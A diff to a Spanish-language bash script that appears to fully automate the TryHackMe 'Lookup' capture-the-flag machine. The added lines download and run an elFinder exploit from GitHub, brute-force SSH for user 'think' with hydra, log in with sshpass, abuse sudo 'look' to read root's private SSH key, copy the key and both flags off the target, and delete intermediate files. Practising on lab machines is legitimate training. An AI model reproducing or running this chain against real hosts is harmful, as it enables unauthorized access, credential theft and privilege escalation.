@@ -26,7 +26,35 @@ echo "Descargando y ejecutando..."
 wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/SecSignal.jpg -O SecSignal.jpg
 wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/elfinder.py -O elfinder.py
 
-python2 elfinder.py http://files.lookup.thm/elFinder 1>/dev/null | tee passwd
-cat passwd | grep -v "\[.*\]"
+python2 elfinder.py http://files.lookup.thm/elFinder | tee output.txt
 
+cat output.txt | grep -v "\[.*\]" > passwords.txt
 
+hydra -l think -P passwords.txt ssh://10.10.3.30 -o password.txt > /dev/null 2>&1
+
+passssh=$(cat password.txt | grep -i login| awk '{print $NF}')
+
+echo -e "\n[+] Password de usuario think encontrada: $passssh"
+
+rm passwords.txt && rm password.txt && rm output.txt && rm SecSignal.jpg && rm elfinder.py
+
+echo -e "\n[+] Conectando por ssh..."
+
+lfile="/root/.ssh/id_rsa"
+
+sshpass -p "$passssh" ssh -o StrictHostKeyChecking=no -T think@10.10.3.30 "echo '$passssh' | sudo -S look '' '$lfile' > /tmp/id_rsaroot" > /dev/null 2>&1
+
+sshpass -p "$passssh" scp think@10.10.3.30:/tmp/id_rsaroot .
+
+mv id_rsaroot id_rsa && chmod 600 id_rsa
+
+scp -i id_rsa root@10.10.3.30:/root/root.txt . 1>/dev/null
+scp -i id_rsa root@10.10.3.30:/home/think/user.txt . 1>/dev/null
+
+cat user.txt | awk '{print "Flag de user: "$0}'
+cat root.txt | awk '{print "Flag de root: " $0}'
+
+dirid=$(pwd)
+echo -e "\n[+]Pwned! id_rsa guardado en: $dirid"
+
+rm user.txt && rm root.txt
